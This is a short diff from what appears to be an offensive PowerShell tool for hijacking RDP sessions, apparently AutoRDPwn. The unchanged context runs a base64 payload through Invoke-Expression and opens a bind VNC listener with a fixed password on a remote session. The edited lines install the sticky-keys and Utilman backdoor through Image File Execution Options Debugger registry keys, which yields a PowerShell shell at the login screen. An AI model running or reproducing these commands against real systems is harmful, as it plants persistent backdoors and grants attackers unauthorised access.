@@ -460,8 +460,8 @@ function Remove-Exclusions {
     Invoke-Expression $base64string | Out-Null ; Invoke-Vnc -ConType bind -Port 5900 -Password AutoRDPwn }}
 	
     if ($stickykeys){ invoke-command -session $RDP[0] -scriptblock {
-    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
-    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
+    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "powershell.exe -noexit ; clear" /f 2>&1> $null
+    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "powershell.exe -noexit ; clear" /f 2>&1> $null
     powercfg /setacvalueindex scheme_current sub_video videoconlock 2400 2>&1> $null ; powercfg /setdcvalueindex scheme_current sub_video videoconlock 2400 2>&1> $null }}
 
         if($version -Like '*Server*') { Write-Host "$version $txt34" -ForegroundColor Red ; invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Green'
